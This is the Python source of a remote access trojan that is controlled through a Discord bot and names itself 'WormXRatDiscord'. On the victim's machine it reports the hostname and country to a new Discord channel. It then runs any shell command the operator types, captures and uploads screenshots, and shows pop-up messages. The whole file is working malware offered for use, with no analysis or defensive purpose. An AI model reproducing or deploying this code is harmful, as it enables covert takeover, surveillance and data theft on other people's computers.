# pip install discord pillow pyautogui requests
# If not works after installion librares, try pip install discord pillow pyautogui requests pyscreeze

import discord
import socket
import subprocess
import pyautogui
import os
import uuid
from tkinter import messagebox
import requests

session = uuid.uuid4()
TOKEN = "Token" # <---- Bot token discord

current_dir = os.getcwd()
intents = discord.Intents.default()
intents.message_content = True

response = requests.get('https://ipinfo.io/json')
jsondataipinfo = response.json()
country = jsondataipinfo.get('country')
client = discord.Client(intents=intents)
channel_ref = None

def get_hostname():
    return socket.gethostname().lower().replace(" ", "-")

@client.event
async def on_ready():
    global channel_ref
    guild = client.guilds[0]
    name = get_hostname()
    channel_ref = await guild.create_text_channel(name)
    await channel_ref.send(f"✅ Connected: `{name}`\n📍 Path: `{current_dir}`\n`!cmd <command>` | `!screen` to screenshot.")
    await channel_ref.send(f"The country where the user lives: `{country}`")
    await channel_ref.send("Type `!cmd cd ..` to go back and `!cmd cd (folder_name)` to go to another folder.")
    await channel_ref.send("Type `!chatsendmsg (message)` to send message for user. using messagebox")
    await channel_ref.send(f"Session: `{session}`")

@client.event
async def on_message(message):
    global channel_ref, current_dir

    if message.author == client.user: return
    if channel_ref is None or message.channel.id != channel_ref.id: return

    # 
    if message.content == "!screen":
        path = os.path.join(os.environ.get('TEMP', os.getcwd()), "s.png")
        try:
            pyautogui.screenshot(path)
            await message.channel.send(file=discord.File(path))
            os.remove(path)
        except Exception as e:
            await message.channel.send(f"Screenshot Error: {e}")

    #
    elif message.content.startswith("!chatsendmsg "):
            announcemsg = message.content[len("!chatsendmsg "):].strip()
            userip = socket.gethostbyname(socket.gethostname())
            await message.channel.send(f"`Message sended to {userip}.`")
            messagebox.showinfo("WormXRatDiscord", f"{announcemsg}")
            

    elif message.content.startswith("!cmd "):
        cmd = message.content[5:].strip()
        
        # 
        if cmd.startswith("cd "):
            new_path = cmd[3:].strip()
            try:
                # 
                temp_path = os.path.abspath(os.path.join(current_dir, new_path))
                if os.path.isdir(temp_path):
                    current_dir = temp_path
                    await message.channel.send(f"📍 Directory changed to: `{current_dir}`")
                else:
                    await message.channel.send("❌ Error: Directory not found.")
            except Exception as e:
                await message.channel.send(f"❌ Error: {e}")
            return

        # 
        try:
            result = subprocess.run(
                cmd, shell=True, capture_output=True, text=True, 
                encoding="cp852", errors="replace", cwd=current_dir
            )
            output = (result.stdout or result.stderr or "Executed.").strip()
            await message.channel.send(f"```\n{output}\n```")
        except Exception as e:
            await message.channel.send(f"Error: {e}")

client.run(TOKEN)
